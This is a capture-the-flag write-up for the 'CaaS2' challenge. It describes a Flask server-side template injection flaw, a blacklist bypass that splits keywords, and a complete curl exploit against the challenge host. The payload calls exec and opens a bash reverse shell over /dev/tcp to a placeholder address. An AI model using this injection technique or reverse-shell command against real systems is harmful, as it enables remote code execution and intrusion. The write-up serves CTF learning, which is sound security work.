# CaaS2

In `server.py` file we see SSTI vulnerability:

```python
...
name = blacklist(request.values['name'])
teamname = request.values['team_name']
return render_template_string(f'<p>Haha! No certificate for {name}</p>')
...
```

But not everything is so simple, the `name` is filtered before rendering with this blacklist (also payload length must be <= 70!):

```python
blacklist = [
    'mro','url','join','attr','dict','()','init','import','os','system','lipsum','current_app',
    'globals','subclasses','|','getitem','popen','read','ls','flag.txt','cycler','[]','0','1',
    '2','3','4','5','6','7','8','9','=','+',':','update','config','self','class','%','#','eval',
    'for','while','f','d','k','h','headers',' ','open','call','subprocesses','g','.t','g.'
]
```

Well, let's bypass blacklisted keywords with splitting them and concatenating, for example:

```python
'__init__' -> '__i''nit__
```


As a gadget, we will use the exec function. To save the length of the main payload, we will move part of it to another parameter. Сombining everything together we get such a payload:

```bash
curl http://challs.n00bzunit3d.xyz:49064/generate \
    -d "name={{request['__i''nit__'].__builtins__['exec'](request.values.a)}}" \
    -d "team_name=foo" \
    -d "a=__import__('os').system('bash -i >& /dev/tcp/ip/port 0>&1')"
```
